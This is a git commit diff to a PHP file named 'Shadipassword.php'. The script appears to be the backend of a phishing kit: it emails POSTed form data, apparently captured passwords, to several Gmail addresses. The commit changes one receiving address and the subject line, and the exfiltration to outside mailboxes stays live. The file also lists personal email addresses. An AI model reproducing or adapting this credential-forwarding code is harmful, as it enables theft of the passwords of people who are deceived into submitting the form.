8cb25f64df5bc171da3c996ab943d1b5d59fcc8e
maolpase721 <maolpase@gmail.com>
2025-09-01 16:15:31 +0500

    Update Shadipassword.php

--- Shadipassword.php
+++ Shadipassword.php
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'passss');
-        $mail->addAddress('brianna.mary.ad@gmail.com');
+        $mail->addAddress('averywilson180@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Sajjad';
+        $mail->Subject = 'shadi';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
